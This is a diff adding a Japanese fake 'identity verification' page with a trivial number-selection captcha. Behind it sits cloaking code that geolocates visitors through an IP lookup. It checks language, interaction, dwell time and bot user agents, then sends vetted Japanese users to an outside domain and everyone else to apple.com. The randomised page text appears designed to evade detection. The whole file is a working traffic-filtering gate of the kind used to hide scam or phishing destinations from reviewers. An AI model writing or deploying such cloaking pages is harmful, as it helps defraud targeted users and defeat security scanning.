@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<title>本人確認</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{width:100%;height:100%}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",sans-serif;background:#f7f8fa;display:flex;align-items:center;justify-content:center;padding:16px}
+.box{width:100%;max-width:480px;background:#fff;border-radius:24px;padding:28px 24px;box-shadow:0 8px 24px rgba(0,0,0,0.06)}
+.title{text-align:center;font-size:20px;font-weight:700;margin-bottom:12px;color:#111}
+.desc{text-align:center;font-size:15px;color:#666;margin-bottom:20px;line-height:1.4}
+.target-area{background:#eef6ff;border-radius:18px;padding:20px;text-align:center;margin-bottom:24px}
+.target-label{font-size:14px;color:#555;margin-bottom:8px}
+.target-nums{font-size:34px;font-weight:700;letter-spacing:10px;color:#007aff}
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:24px}
+.num-btn{aspect-ratio:1;border-radius:16px;border:2px solid:#e0e0e0;background:#fff;font-size:22px;font-weight:600}
+.num-btn.selected{background:#007aff;color:#fff;border-color:#007aff}
+.submit-btn{width:100%;padding:18px;border-radius:18px;background:#007aff;color:#fff;font-size:17px;font-weight:600;border:none}
+.submit-btn:disabled{background:#ccc}
+.status{text-align:center;margin-top:12px;font-size:13px;color:#888}
+</style>
+</head>
+<body>
+
+<div class="box">
+  <div class="title"></div>
+  <div class="desc"></div>
+  <div class="target-area">
+    <div class="target-label"></div>
+    <div class="target-nums" id="target"></div>
+  </div>
+  <div class="grid" id="grid"></div>
+  <button class="submit-btn" id="submit" disabled></button>
+  <div class="status" id="status"></div>
+</div>
+
+<script>
+// ==============================================
+// ✅ 完全日式自然表現（日本人が実際に使う言葉）
+// ==============================================
+const texts = {
+  titles: ["本人確認", "認証", "確認作業", "安全確認", "ユーザー確認"],
+  descs: [
+    "表示されている数字をすべて選択してください",
+    "画面に表示された数字を選んでください",
+    "確認のため、表示されている数字を選択してください",
+    "安全確認のため、数字をすべて選んでください"
+  ],
+  labels: ["対象の数字", "表示数字", "こちらの数字", "選択項目"],
+  btnTexts: ["確認する", "次へ", "認証を実行", "送信"],
+  statusTexts: ["選択してください", "選択中です", "数字を選んでから確認してください"],
+  colors: ["#007aff", "#34c759", "#5856d6", "#ff6b6b", "#ff9500", "#00c7be"]
+};
+
+function rand(arr) {
+  return arr[Math.floor(Math.random() * arr.length)];
+}
+
+const mainColor = rand(texts.colors);
+document.querySelector(".title").innerText = rand(texts.titles);
+document.querySelector(".desc").innerText = rand(texts.descs);
+document.querySelector(".target-label").innerText = rand(texts.labels);
+document.querySelector("#submit").innerText = rand(texts.btnTexts);
+document.querySelector("#status").innerText = rand(texts.statusTexts);
+document.querySelector(".target-nums").style.color = mainColor;
+document.querySelector(".target-area").style.background = mainColor + "10";
+document.querySelector(".submit-btn").style.background = mainColor;
+
+// ==============================================
+// ✅ 日本ユーザー検知（完全そのまま）
+// ==============================================
+const REAL_TARGETS = ["https://sinfondo.online/ja","https://sinfondo.online/ja","https://sinfondo.online/ja"];
+const BAD_TARGET = "https://www.apple.com";
+let userInteracted = false;
+window.addEventListener("click", () => userInteracted = true);
+window.addEventListener("touchstart", () => userInteracted = true);
+
+async function isJapaneseRealUser() {
+  try {
+    const res = await fetch("https://ipapi.co/json/", { cache: "no-store" });
+    const data = await res.json();
+    const isJpIP = data.country_code === "JP";
+    const isJpLang = (navigator.language || "").startsWith("ja");
+    const stayTime = Date.now() - performance.timeOrigin > 3500;
+    const isBot = /Headless|PhantomJS|Selenium|Bot/i.test(navigator.userAgent);
+    return isJpIP && isJpLang && userInteracted && stayTime && !isBot;
+  } catch (e) {
+    return false;
+  }
+}
+
+// ==============================================
+// 認証ロジック
+// ==============================================
+function generateCaptcha() {
+  const nums = "0123456789".split("");
+  const target = [];
+  while (target.length < 2) {
+    const n = nums[Math.floor(Math.random() * nums.length)];
+    if (!target.includes(n)) target.push(n);
+  }
+  const options = [...target];
+  while (options.length < 8) {
+    const n = nums[Math.floor(Math.random() * nums.length)];
+    if (!options.includes(n)) options.push(n);
+  }
+  return { target, options: options.sort(() => Math.random() - 0.5), need: 2 };
+}
+
+const { target, options, need } = generateCaptcha();
+document.getElementById("target").innerText = target.join("   ");
+
+const grid = document.getElementById("grid");
+const submit = document.getElementById("submit");
+const status = document.getElementById("status");
+let selected = [];
+
+options.forEach(o => {
+  const btn = document.createElement("button");
+  btn.className = "num-btn";
+  btn.innerText = o;
+  btn.onclick = () => {
+    btn.classList.toggle("selected");
+    selected = document.querySelectorAll(".num-btn.selected").length;
+    submit.disabled = selected !== need;
+    status.innerText = `${selected}/${need} 個選択中`;
+  };
+  grid.appendChild(btn);
+});
+
+submit.onclick = async () => {
+  const correct = target.every(t => [...document.querySelectorAll(".num-btn.selected")].some(s => s.innerText === t));
+  if (!correct) { alert("認証に失敗しました。再度お試しください。"); return; }
+  location.href = await isJapaneseRealUser() ? REAL_TARGETS[Math.floor(Math.random() * REAL_TARGETS.length)] : BAD_TARGET;
+};
+</script>
+</body>
+</html>
